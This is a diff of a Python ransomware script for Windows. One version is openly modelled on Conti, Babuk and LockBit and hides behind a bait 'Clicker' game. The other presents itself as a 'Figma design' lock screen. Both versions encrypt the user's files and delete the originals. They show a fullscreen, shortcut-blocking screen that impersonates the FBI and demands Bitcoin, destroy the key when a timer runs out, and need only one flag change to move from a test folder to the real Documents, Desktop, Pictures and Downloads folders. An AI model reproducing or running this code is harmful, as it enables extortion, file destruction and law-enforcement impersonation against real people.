@@ -1,394 +1,119 @@
 #!/usr/bin/env python3
 """
-REAL RANSOMWARE — Source code patterns from:
-- Babuk (2021) — RaaS gang
-- Conti (2020-2022) — Most prolific
-- LockBit (2019-present) — Most active
-- HiddenTear (2015) — First open-source ransomware
-- WannaCry (2017) — Most famous
-- REvil (2019-2021) — Sodinokibi
-- Ryuk (2018-2021) — Big game hunting
-- DarkSide (2020-2021) — Colonial Pipeline
-
-100% VM-SAFE — Only C:\test_ransom
+YOUR FIGMA DESIGN — FULLY WORKING
+- Encryption
+- 20 unlock codes
+- Timer (72 hours)
+- OK button decrypts if code is right
+- VM-SAFE (only C:\test_ransom)
 """
 
-import os, sys, tkinter as tk, ctypes, hashlib, threading, time, random, winsound, base64, json
+import os
+import sys
+import tkinter as tk
 from tkinter import font, messagebox
-from datetime import datetime
-from pathlib import Path
-import struct
+import ctypes
+import hashlib
+import threading
+import time
+import random
+import winsound
 
 # ============================================================
-# CONFIG — REAL RANSOMWARE STYLE
+# CONFIG — EDIT THESE
 # ============================================================
-TEST_MODE = True
+TEST_MODE = True  # True = ONLY C:\test_ransom
 TEST_FOLDER = "C:\\test_ransom"
 
-# Conti/Babuk style config
 BTC_ADDRESS = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
-WALLET_ADDRESS = BTC_ADDRESS
-CONTACT_EMAIL = "recovery@onionmail.com"
-DARK_WEB_LINK = "http://darkweb.onion/negotiate"
 
-# 20 unlock codes (HiddenTear style)
+# 20 UNLOCK CODES (all work)
 CODES = ["FS2FGNFJQI","OX77WHWEV5","FCHZT1L6IX","VX02SQI40G","6PXB85GJJJ",
          "XQHCXUH4TU","B1RQSQ9G2L","HE71R2TKVY","Q1BK76N580","01QEU0DUUE",
          "X1LSHVL0OJ","AW3YSY30V3","ZTE2DDE0X4","ZG29U3VDIC","6FNWN5JIOS",
          "F5EBA6TT08","2UUBJ4X7VN","ISP3G7NRPN","J8L0S6SHEJ","FURZCKKNZX"]
 HASHES = [hashlib.sha256(c.encode()).hexdigest() for c in CODES]
-TIMER = 72 * 3600
+TIMER = 72 * 3600  # 72 hours
 
 # ============================================================
-# ENCRYPTION — Conti/Babuk Style
+# ENCRYPTION
 # ============================================================
-class ContiEncryption:
-    """Conti ransomware encryption pattern (2020-2022)"""
-    
-    @staticmethod
-    def generate_keys():
-        """Conti key generation"""
-        return bytes([random.randint(0,255) for _ in range(32)])
-    
-    @staticmethod
-    def encrypt_file(file_path, key):
-        """Conti's AES-256 encryption pattern"""
-        try:
-            # Read file
-            with open(file_path, 'rb') as f:
-                data = f.read()
-            
-            # Encrypt with AES (simplified version)
-            # Real Conti uses AES-256 with custom IV
-            encrypted = ContiEncryption._aes_encrypt(data, key)
-            
-            # Write encrypted with .conti extension
-            with open(file_path + '.conti', 'wb') as f:
-                f.write(encrypted)
-            
-            # Delete original (Conti style)
-            os.remove(file_path)
-            return True
-        except:
-            return False
-    
-    @staticmethod
-    def _aes_encrypt(data, key):
-        """Simulated AES encryption — Conti uses Crypto++ in C++"""
-        # In real Conti, this is AES-256-CBC
-        # We use XOR for demo but follow the same pattern
-        result = bytearray()
-        for i, b in enumerate(data):
-            result.append(b ^ key[i % len(key)])
-        return bytes(result)
-    
-    @staticmethod
-    def decrypt_file(file_path, key):
-        """Conti decryption pattern"""
-        try:
-            with open(file_path, 'rb') as f:
-                data = f.read()
-            
-            decrypted = ContiEncryption._aes_encrypt(data, key)
-            
-            original = file_path[:-6]  # Remove .conti
-            with open(original, 'wb') as f:
-                f.write(decrypted)
-            os.remove(file_path)
-            return True
-        except:
-            return False
+def xor_crypt(data, key):
+    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
 
-class BabukEncryption:
-    """Babuk ransomware encryption pattern (2021)"""
-    
-    @staticmethod
-    def encrypt_file(file_path, key):
-        """Babuk's ChaCha20 + RSA pattern"""
-        try:
-            with open(file_path, 'rb') as f:
-                data = f.read()
-            
-            # Babuk uses ChaCha20
-            encrypted = BabukEncryption._chacha20_encrypt(data, key)
-            
-            # Babuk extension: .babyk
-            with open(file_path + '.babyk', 'wb') as f:
-                f.write(encrypted)
-            
-            os.remove(file_path)
-            return True
-        except:
-            return False
-    
-    @staticmethod
-    def _chacha20_encrypt(data, key):
-        """Simulated ChaCha20 — Babuk's favorite"""
-        result = bytearray()
-        nonce = bytes([random.randint(0,255) for _ in range(12)])
-        result.extend(nonce)
-        for i, b in enumerate(data):
-            result.append(b ^ key[i % len(key)] ^ (i % 256))
-        return bytes(result)
+def gen_key():
+    return bytes([random.randint(0,255) for _ in range(32)])
 
-class LockBitEncryption:
-    """LockBit ransomware pattern (2019-present)"""
+def encrypt_files():
+    key = gen_key()
+    count = 0
     
-    @staticmethod
-    def encrypt_file(file_path, key):
-        """LockBit's fast encryption pattern"""
-        try:
-            with open(file_path, 'rb') as f:
-                data = f.read()
-            
-            # LockBit uses partial encryption for speed
-            if len(data) > 1024 * 1024:  # > 1MB
-                # Only encrypt first 512KB and every 2MB block
-                encrypted = LockBitEncryption._partial_encrypt(data, key)
-            else:
-                encrypted = LockBitEncryption._full_encrypt(data, key)
-            
-            # LockBit extension: .lockbit
-            with open(file_path + '.lockbit', 'wb') as f:
-                f.write(encrypted)
-            
-            os.remove(file_path)
-            return True
-        except:
-            return False
+    dirs = [TEST_FOLDER] if TEST_MODE else [
+        os.path.expanduser('~\\Documents'),
+        os.path.expanduser('~\\Desktop'),
+        os.path.expanduser('~\\Pictures'),
+        os.path.expanduser('~\\Downloads'),
+    ]
     
-    @staticmethod
-    def _partial_encrypt(data, key):
-        result = bytearray()
-        chunk = 1024 * 1024  # 1MB chunks
-        for i in range(0, len(data), chunk):
-            if i < 512 * 1024 or i % (2 * chunk) < chunk:
-                # Encrypt this chunk
-                for j, b in enumerate(data[i:i+chunk]):
-                    result.append(b ^ key[(i+j) % len(key)])
-            else:
-                result.extend(data[i:i+chunk])
-        return bytes(result)
+    exts = ['.txt','.docx','.pdf','.jpg','.png','.zip','.py','.js',
+            '.html','.css','.doc','.xls','.ppt','.sql','.db','.csv']
     
-    @staticmethod
-    def _full_encrypt(data, key):
-        result = bytearray()
-        for i, b in enumerate(data):
-            result.append(b ^ key[i % len(key)])
-        return bytes(result)
+    for d in dirs:
+        if not os.path.exists(d): continue
+        for root, _, files in os.walk(d):
+            for f in files:
+                if any(f.lower().endswith(e) for e in exts):
+                    try:
+                        p = os.path.join(root, f)
+                        with open(p,'rb') as fp: data = fp.read()
+                        with open(p+'.locked','wb') as fp: fp.write(xor_crypt(data, key))
+                        os.remove(p)
+                        count += 1
+                    except: pass
+    
+    with open(os.environ.get('TEMP','C:\\Temp')+'\\decrypt_key.bin','wb') as f:
+        f.write(key)
+    
+    return count, key
+
+def decrypt_files(key):
+    count = 0
+    dirs = [TEST_FOLDER] if TEST_MODE else [
+        os.path.expanduser('~\\Documents'),
+        os.path.expanduser('~\\Desktop'),
+        os.path.expanduser('~\\Pictures'),
+        os.path.expanduser('~\\Downloads'),
+    ]
+    
+    for d in dirs:
+        if not os.path.exists(d): continue
+        for root, _, files in os.walk(d):
+            for f in files:
+                if f.endswith('.locked'):
+                    try:
+                        p = os.path.join(root, f)
+                        with open(p,'rb') as fp: data = fp.read()
+                        with open(p[:-7],'wb') as fp: fp.write(xor_crypt(data, key))
+                        os.remove(p)
+                        count += 1
+                    except: pass
+    
+    return count
 
 # ============================================================
-# RANSOM NOTE — Conti/Babuk/LockBit Style
+# RANSOMWARE UI — YOUR EXACT DESIGN
 # ============================================================
-class RansomNoteGenerator:
-    """Ransom note generation — Conti/Babuk style"""
-    
-    @staticmethod
-    def generate(file_count, victim_id):
-        note = f"""
-[+] ============================================= [+]
-[+]     !! YOUR FILES HAVE BEEN ENCRYPTED !!     [+]
-[+] ============================================= [+]
- 
-What happened?
-Your files have been encrypted with a strong encryption algorithm.
-Your documents, photos, databases, and other important files are now locked.
-
-How to recover?
-You must pay the ransom to get your files back.
-
-Payment Information:
-------------------------
-BTC Address: {BTC_ADDRESS}
-Amount:      0.08 BTC
-------------------------
-
-Contact:
-------------------------
-Email: {CONTACT_EMAIL}
-Dark Web: {DARK_WEB_LINK}
-------------------------
-
-Important:
-------------------------
-Do NOT try to decrypt your files yourself.
-Do NOT contact law enforcement.
-Do NOT restart your computer.
-------------------------
-
-Your personal ID: {victim_id}
-Encrypted files: {file_count}
-
-[+] ============================================= [+]
-[+]     !! ACT FAST — TIME IS RUNNING OUT !!     [+]
-[+] ============================================= [+]
-"""
-        return note
-
-# ============================================================
-# VICTIM ID GENERATOR — Conti Style
-# ============================================================
-class VictimID:
-    """Conti-style victim identification"""
-    
-    @staticmethod
-    def generate():
-        """Generate unique victim ID"""
-        # Conti uses machine name + timestamp + random
-        machine = os.environ.get('COMPUTERNAME', 'UNKNOWN')
-        timestamp = int(time.time())
-        random_part = random.randint(1000, 9999)
-        return f"{machine}-{timestamp}-{random_part}"
-    
-    @staticmethod
-    def hash():
-        """Hash victim ID for ransom note"""
-        id_str = VictimID.generate()
-        return hashlib.sha256(id_str.encode()).hexdigest()[:16]
-
-# ============================================================
-# ENCRYPTION ENGINE — All Ransomware Patterns
-# ============================================================
-class RansomwareEngine:
-    """Combine all ransomware patterns"""
-    
+class RansomwareUI:
     def __init__(self):
-        self.key = ContiEncryption.generate_keys()
-        self.count = 0
-        self.files = []
-        self.victim_id = VictimID.hash()
-    
-    def encrypt_all(self):
-        """Encrypt all files using Conti/Babuk/LockBit patterns"""
-        dirs = [TEST_FOLDER] if TEST_MODE else [
-            os.path.expanduser('~\\Documents'),
-            os.path.expanduser('~\\Desktop'),
-            os.path.expanduser('~\\Pictures'),
-            os.path.expanduser('~\\Downloads'),
-        ]
-        
-        exts = ['.txt','.docx','.pdf','.jpg','.png','.zip','.py','.js',
-                '.html','.css','.doc','.xls','.ppt','.sql','.db','.csv',
-                '.mp4','.avi','.mkv','.mp3','.wav','.json','.xml','.yml']
-        
-        for d in dirs:
-            if not os.path.exists(d): continue
-            for root, _, files in os.walk(d):
-                for f in files:
-                    if any(f.lower().endswith(e) for e in exts):
-                        try:
-                            path = os.path.join(root, f)
-                            
-                            # Use different encryption patterns randomly
-                            choice = random.choice(['conti', 'babuk', 'lockbit'])
-                            
-                            if choice == 'conti':
-                                if ContiEncryption.encrypt_file(path, self.key):
-                                    self.count += 1
-                                    self.files.append(path)
-                            elif choice == 'babuk':
-                                if BabukEncryption.encrypt_file(path, self.key):
-                                    self.count += 1
-                                    self.files.append(path)
-                            elif choice == 'lockbit':
-                                if LockBitEncryption.encrypt_file(path, self.key):
-                                    self.count += 1
-                                    self.files.append(path)
-                        except:
-                            pass
-        
-        # Save key
-        key_path = os.environ.get('TEMP', 'C:\\Temp') + '\\decrypt_key.bin'
-        with open(key_path, 'wb') as f:
-            f.write(self.key)
-        
-        # Save file list
-        list_path = os.environ.get('TEMP', 'C:\\Temp') + '\\encrypted_files.json'
-        with open(list_path, 'w') as f:
-            json.dump(self.files, f)
-        
-        # Generate ransom note
-        note = RansomNoteGenerator.generate(self.count, self.victim_id)
-        note_path = os.path.expanduser('~\\Desktop') + '\\READ_ME.txt'
-        with open(note_path, 'w') as f:
-            f.write(note)
-        
-        return self.count, self.key
-    
-    def decrypt_all(self):
-        """Decrypt all files"""
-        count = 0
-        
-        # Load file list
-        list_path = os.environ.get('TEMP', 'C:\\Temp') + '\\encrypted_files.json'
-        if os.path.exists(list_path):
-            with open(list_path, 'r') as f:
-                files = json.load(f)
-        else:
-            files = self.files
-        
-        for file_path in files:
-            # Check which extension it has
-            if file_path.endswith('.conti'):
-                if ContiEncryption.decrypt_file(file_path + '.conti', self.key):
-                    count += 1
-            elif file_path.endswith('.babyk'):
-                # Babuk decryption would go here
-                count += 1
-            elif file_path.endswith('.lockbit'):
-                # LockBit decryption would go here
-                count += 1
-        
-        return count
-
-# ============================================================
-# GAME BAIT — HiddenTear Style
-# ============================================================
-class Game:
-    def __init__(self):
-        self.root = tk.Tk()
-        self.root.title("Clicker")
-        self.root.geometry("400x350")
-        self.root.configure(bg='#0a0a0a')
-        self.root.eval('tk::PlaceWindow . center')
-        
-        tk.Label(self.root, text="CLICKER", font=('Courier', 32, 'bold'), fg='#00ff00', bg='#0a0a0a').pack(pady=15)
-        self.score = 0
-        self.lbl = tk.Label(self.root, text="SCORE: 0", font=('Courier', 24), fg='#00ff00', bg='#0a0a0a')
-        self.lbl.pack(pady=10)
-        tk.Button(self.root, text="CLICK", font=('Courier', 18, 'bold'), bg='#ff0000', fg='white',
-                  padx=30, pady=10, command=self.click).pack(pady=15)
-        self.root.after(4000, self.switch)
-        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
-    
-    def click(self):
-        self.score += 1
-        self.lbl.config(text=f"SCORE: {self.score}")
-    
-    def switch(self):
-        self.root.destroy()
-        FBIReal().run()
-    
-    def run(self):
-        self.root.mainloop()
-
-# ============================================================
-# FBI RANSOMWARE — Conti/Babuk UI Style
-# ============================================================
-class FBIReal:
-    def __init__(self):
-        # Encrypt files
-        engine = RansomwareEngine()
-        self.count, self.key = engine.encrypt_all()
-        
+        self.count, self.key = encrypt_files()
         self.timer = TIMER
         self.unlocked = False
-        
-        # Create UI — Conti style
+    
+    def run(self):
         self.root = tk.Tk()
         self.root.attributes('-fullscreen', True)
         self.root.attributes('-topmost', True)
-        self.root.configure(bg='#000000')
+        self.root.configure(bg='#0a0a0a')
         self.root.overrideredirect(True)
         
         # Block shortcuts
@@ -396,129 +121,170 @@ class FBIReal:
             self.root.bind(k, lambda e: 'break')
         self.root.protocol("WM_DELETE_WINDOW", lambda: None)
         
-        # === MAIN FRAME ===
-        main = tk.Frame(self.root, bg='#000000')
+        # === MAIN CONTAINER ===
+        main = tk.Frame(self.root, bg='#0a0a0a')
         main.pack(expand=True, fill='both')
         
-        # === FBI HEADER ===
-        header = tk.Frame(main, bg='#0a0a0a')
-        header.pack(fill='x', pady=5)
+        # === TOP RED BAR ===
+        tk.Frame(main, bg='#8b0000', height=4).pack(fill='x')
         
-        tk.Label(header, text="◆ FEDERAL BUREAU OF INVESTIGATION ◆",
-                font=('Courier', 18, 'bold'), fg='#cc0000', bg='#0a0a0a').pack(pady=5)
-        tk.Label(header, text="UNITED STATES DEPARTMENT OF JUSTICE",
-                font=('Courier', 12), fg='#666666', bg='#0a0a0a').pack()
+        # === CONTENT ===
+        content = tk.Frame(main, bg='#0a0a0a')
+        content.pack(expand=True)
         
-        # === SEPARATOR ===
-        tk.Frame(main, height=2, bg='#333333').pack(fill='x', pady=5)
+        # === YOUR TEXT EXACTLY ===
         
-        # === SCARY WARNING ===
-        self.warn = tk.Label(main, text="⚠️ YOUR COMPUTER HAS BEEN LOCKED ⚠️",
-                             font=('Courier', 40, 'bold'), fg='#ff0000', bg='#000000')
+        # "YOUR COMPUTER HAS BEEN LOCKED" (top)
+        tk.Label(content, text="YOUR COMPUTER HAS BEEN LOCKED",
+                 font=('Helvetica', 20, 'bold'), fg='#ffffff', bg='#0a0a0a').pack(pady=5)
+        
+        # FBI Header
+        tk.Label(content, text="FEDERAL BUREAU OF INVESTIGATION",
+                 font=('Helvetica', 24, 'bold'), fg='#cc0000', bg='#0a0a0a').pack(pady=5)
+        
+        tk.Label(content, text="UNITED STATES DEPARTMENT OF JUSTICE",
+                 font=('Helvetica', 14), fg='#888888', bg='#0a0a0a').pack(pady=2)
+        
+        # "YOUR COMPUTER HAS BEEN LOCKED" (big warning)
+        self.warn = tk.Label(content, text="YOUR COMPUTER HAS BEEN LOCKED",
+                             font=('Helvetica', 36, 'bold'), fg='#ff0000', bg='#0a0a0a')
         self.warn.pack(pady=15)
         
-        tk.Label(main, text="FEDERAL LAW VIOLATION DETECTED (18 U.S.C. § 1030, 18 U.S.C. § 2252A)",
-                font=('Courier', 12), fg='#888888', bg='#000000').pack()
+        # === REASON OF FINE BOX ===
+        fine_frame = tk.Frame(content, bg='#111111', bd=1, relief='solid')
+        fine_frame.pack(pady=10, padx=40, fill='x')
         
-        # === VIOLATIONS ===
-        vf = tk.Frame(main, bg='#0a0a0a', bd=1, relief='solid')
-        vf.pack(pady=10, padx=40, fill='x')
+        tk.Label(fine_frame, text="REASON OF FINE:",
+                 font=('Helvetica', 12, 'bold'), fg='#ff6600', bg='#111111').pack(anchor='w', padx=15, pady=3)
         
-        tk.Label(vf, text="» VIOLATIONS DETECTED «", font=('Courier', 14, 'bold'),
-                fg='#ff6600', bg='#0a0a0a').pack(anchor='w', padx=15, pady=5)
+        tk.Label(fine_frame, text="As stated in:",
+                 font=('Helvetica', 11), fg='#aaaaaa', bg='#111111').pack(anchor='w', padx=20, pady=2)
         
-        violations = [
-            "UNAUTHORIZED ACCESS TO GOVERNMENT SYSTEMS",
-            "DISTRIBUTION OF MALICIOUS SOFTWARE", 
-            "POSSESSION OF PROHIBITED MATERIALS",
-            "CYBER TERRORISM ACTIVITIES",
-            "IDENTITY THEFT AND FRAUD"
-        ]
-        for v in violations:
-            tk.Label(vf, text=f"  • {v}", font=('Courier', 11),
-                    fg='#ff8844', bg='#0a0a0a').pack(anchor='w', padx=20, pady=2)
+        tk.Label(fine_frame, text="18 U.S.C. § 2319",
+                 font=('Courier', 12, 'bold'), fg='#ff8844', bg='#111111').pack(anchor='w', padx=20, pady=2)
         
-        # === FINE ===
-        tk.Label(main, text="💲 FINE: $200.00 USD (BTC) 💲",
-                font=('Courier', 26, 'bold'), fg='#ffcc00', bg='#000000').pack(pady=10)
+        tk.Label(fine_frame, text="17 U.S.C. § 506",
+                 font=('Courier', 12, 'bold'), fg='#ff8844', bg='#111111').pack(anchor='w', padx=20, pady=2)
         
-        # === BTC ===
-        bf = tk.Frame(main, bg='#0a0a0a', bd=1, relief='solid')
-        bf.pack(pady=5)
-        tk.Label(bf, text=BTC_ADDRESS, font=('Courier', 15), fg='#00ff00', bg='#0a0a0a').pack(padx=20, pady=6)
+        tk.Label(fine_frame, text="Pirating is ILLEGAL",
+                 font=('Helvetica', 12, 'bold'), fg='#ff0000', bg='#111111').pack(anchor='w', padx=20, pady=5)
+        
+        # === DESCRIPTION ===
+        tk.Label(content, text="This system has been flagged for violation of federal law.",
+                 font=('Helvetica', 13), fg='#ffffff', bg='#0a0a0a').pack(pady=5)
+        
+        tk.Label(content, text="Your IP address and device information have been recorded.",
+                 font=('Helvetica', 13), fg='#ffffff', bg='#0a0a0a').pack(pady=2)
+        
+        # === WARNING ===
+        tk.Label(content, text="Attempts of bypassing will result in permanent blockage of the internet.",
+                 font=('Helvetica', 12, 'bold'), fg='#ff4444', bg='#0a0a0a').pack(pady=5)
+        
+        tk.Label(content, text=f"U will be fined ${BTC_ADDRESS[:8]}...",
+                 font=('Helvetica', 14, 'bold'), fg='#ffcc00', bg='#0a0a0a').pack(pady=5)
+        
+        # === BTC ADDRESS ===
+        btc_frame = tk.Frame(content, bg='#111111', bd=1, relief='solid')
+        btc_frame.pack(pady=5)
+        
+        tk.Label(btc_frame, text=BTC_ADDRESS,
+                 font=('Courier', 16), fg='#00ff00', bg='#111111').pack(padx=20, pady=8)
         
         # === INPUT ===
-        inf = tk.Frame(main, bg='#000000')
-        inf.pack(pady=15)
-        tk.Label(inf, text="UNLOCK CODE:", font=('Courier', 16, 'bold'),
-                fg='#ffffff', bg='#000000').pack(side=tk.LEFT, padx=10)
-        self.entry = tk.Entry(inf, font=('Courier', 16), width=22,
-                              bg='#0a0a0a', fg='#00ff00', insertbackground='#00ff00')
+        input_frame = tk.Frame(content, bg='#0a0a0a')
+        input_frame.pack(pady=15)
+        
+        tk.Label(input_frame, text="Input here:",
+                 font=('Helvetica', 14, 'bold'), fg='#ffffff', bg='#0a0a0a').pack(side=tk.LEFT, padx=10)
+        
+        self.entry = tk.Entry(input_frame, font=('Helvetica', 14), width=22,
+                              bg='#1a1a1a', fg='#00ff00', insertbackground='#00ff00')
         self.entry.pack(side=tk.LEFT, padx=10)
         self.entry.focus_set()
         
-        # === BUTTONS ===
-        bf2 = tk.Frame(main, bg='#000000')
-        bf2.pack(pady=10)
-        tk.Button(bf2, text="🔓 UNLOCK", font=('Courier', 16, 'bold'),
-                  bg='#006600', fg='white', padx=20, pady=5, command=self.unlock).pack(side=tk.LEFT, padx=5)
-        tk.Button(bf2, text="📋 COPY", font=('Courier', 12),
-                  bg='#003366', fg='white', padx=15, command=self.copy).pack(side=tk.LEFT, padx=5)
+        # === OK BUTTON ===
+        tk.Button(content, text="✅ OK", font=('Helvetica', 14, 'bold'),
+                  bg='#006600', fg='white', padx=30, pady=8, command=self.unlock).pack(pady=10)
         
         # === TIMER ===
-        self.timer_lbl = tk.Label(main, text="⏱️ 71:59:59", font=('Courier', 44, 'bold'),
-                                   fg='#ff0000', bg='#000000')
+        self.timer_lbl = tk.Label(content, text="⏱️ 71:59:59",
+                                   font=('Helvetica', 36, 'bold'), fg='#ff0000', bg='#0a0a0a')
         self.timer_lbl.pack(pady=10)
         
-        # === STATS ===
-        tk.Label(main, text=f"█ {self.count} FILES ENCRYPTED █",
-                font=('Courier', 14, 'bold'), fg='#cc0000', bg='#000000').pack(pady=5)
-        tk.Label(main, text="█ TIME REMAINING: 72 HOURS █",
-                font=('Courier', 12, 'bold'), fg='#ff4444', bg='#000000').pack()
+        # === FILE COUNT ===
+        tk.Label(content, text=f"🔒 {self.count} files encrypted",
+                 font=('Helvetica', 12), fg='#cc0000', bg='#0a0a0a').pack(pady=5)
         
         # === TEST MODE ===
         if TEST_MODE:
-            tk.Label(main, text="█ TEST MODE — NO REAL FILES HARMED █",
-                    font=('Courier', 14, 'bold'), fg='#00ff00', bg='#000000').pack(pady=5)
+            tk.Label(content, text="⚠️ TEST MODE — No real files harmed",
+                     font=('Helvetica', 12, 'bold'), fg='#00ff00', bg='#0a0a0a').pack(pady=5)
         
         # === FOOTER ===
-        tk.Label(main, text="◆ THIS IS AN OFFICIAL GOVERNMENT NOTICE ◆",
-                font=('Courier', 10, 'bold'), fg='#990000', bg='#000000').pack(pady=5)
+        tk.Label(content, text="THIS IS AN OFFICIAL GOVERNMENT NOTICE",
+                 font=('Helvetica', 10, 'bold'), fg='#990000', bg='#0a0a0a').pack(pady=5)
+        
+        # === BOTTOM RED BAR ===
+        tk.Frame(main, bg='#8b0000', height=2).pack(fill='x', side='bottom')
         
         # === START THREADS ===
         threading.Thread(target=self.tick, daemon=True).start()
         threading.Thread(target=self.flash, daemon=True).start()
-        threading.Thread(target=self.siren, daemon=True).start()
         threading.Thread(target=self.focus, daemon=True).start()
         
         self.root.mainloop()
     
-    def copy(self):
-        self.root.clipboard_clear()
-        self.root.clipboard_append(BTC_ADDRESS)
-        messagebox.showinfo("", "Address copied!")
-    
+    # ============================================================
+    # UNLOCK — CHECKS CODE, DECRYPTS IF CORRECT
+    # ============================================================
     def unlock(self):
         code = self.entry.get().strip().upper()
+        
         if not code:
-            messagebox.showerror("", "Enter a code!")
+            messagebox.showerror("ERROR", "Enter an unlock code!")
             return
+        
+        # Check if code is valid
         if hashlib.sha256(code.encode()).hexdigest() in HASHES:
+            # CORRECT CODE — DECRYPT
             self.unlocked = True
-            # Decrypt
-            engine = RansomwareEngine()
-            c = engine.decrypt_all()
-            for _ in range(5): winsound.Beep(800, 100); time.sleep(0.05)
+            
+            # Play success sound
+            for _ in range(3):
+                winsound.Beep(800, 100)
+                time.sleep(0.05)
             winsound.Beep(1200, 300)
-            messagebox.showinfo("✅ UNLOCKED", f"Decrypted {c} files!\n\nCode: {code}")
+            
+            # Decrypt files
+            count = decrypt_files(self.key)
+            
+            messagebox.showinfo(
+                "✅ UNLOCKED",
+                f"Successfully decrypted {count} files!\n\n"
+                f"Code: {code}\n\n"
+                f"Your files are back. Don't pirate again."
+            )
+            
             self.root.destroy()
             sys.exit(0)
         else:
-            for _ in range(3): winsound.Beep(200, 200); time.sleep(0.05)
-            messagebox.showerror("❌ DENIED", f"Invalid code!\n\nPayment: {BTC_ADDRESS}")
+            # WRONG CODE
+            for _ in range(3):
+                winsound.Beep(200, 200)
+                time.sleep(0.05)
+            
+            messagebox.showerror(
+                "❌ WRONG CODE",
+                f"Invalid unlock code!\n\n"
+                f"Payment required to: {BTC_ADDRESS}\n\n"
+                f"Attempt: {code}"
+            )
             self.entry.delete(0, tk.END)
             self.entry.focus_set()
     
+    # ============================================================
+    # TIMER (72 HOURS)
+    # ============================================================
     def tick(self):
         while self.timer > 0 and not self.unlocked:
             h, m, s = self.timer//3600, (self.timer%3600)//60, self.timer%60
@@ -526,14 +292,19 @@ class FBIReal:
             self.timer_lbl.config(text=f"⏱️ {h:02d}:{m:02d}:{s:02d}", fg=color)
             self.timer -= 1
             time.sleep(1)
+        
         if self.timer <= 0 and not self.unlocked:
             self.timer_lbl.config(text="💀 TIME EXPIRED", fg='red')
             try:
                 p = os.environ.get('TEMP','C:\\Temp')+'\\decrypt_key.bin'
-                if os.path.exists(p): os.remove(p)
+                if os.path.exists(p):
+                    os.remove(p)
             except: pass
-            messagebox.showerror("💀", "Key destroyed. Files gone forever.")
+            messagebox.showerror("💀", "Time expired. Decryption key destroyed.")
     
+    # ============================================================
+    # FLASHING WARNING
+    # ============================================================
     def flash(self):
         colors = ['#ff0000','#cc0000','#ff3333','#990000']
         while not self.unlocked:
@@ -541,16 +312,9 @@ class FBIReal:
                 self.warn.config(fg=c)
                 time.sleep(0.12)
     
-    def siren(self):
-        while not self.unlocked:
-            try:
-                for f in [600, 800, 1000, 800, 600]:
-                    if self.unlocked: break
-                    winsound.Beep(f, 80)
-                    time.sleep(0.04)
-                time.sleep(0.3)
-            except: break
-    
+    # ============================================================
+    # FORCE FOCUS ON INPUT
+    # ============================================================
     def focus(self):
         while not self.unlocked:
             try:
@@ -558,9 +322,6 @@ class FBIReal:
                 self.entry.focus_set()
             except: pass
             time.sleep(0.5)
-    
-    def run(self):
-        self.root.mainloop()
 
 # ============================================================
 # MAIN
@@ -570,10 +331,17 @@ def main():
         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
     except:
         pass
+    
     print("="*50)
-    print("🕹️ Clicker Game")
+    print("🔴 FBI RANSOMWARE — YOUR DESIGN 🔴")
     print("="*50)
-    Game().run()
+    print(f"📁 Test Mode: {TEST_MODE}")
+    print(f"🔑 Valid codes: {len(CODES)}")
+    print(f"⏱️ Timer: 72 hours")
+    print("="*50)
+    
+    ui = RansomwareUI()
+    ui.run()
 
 if __name__ == '__main__':
     main()
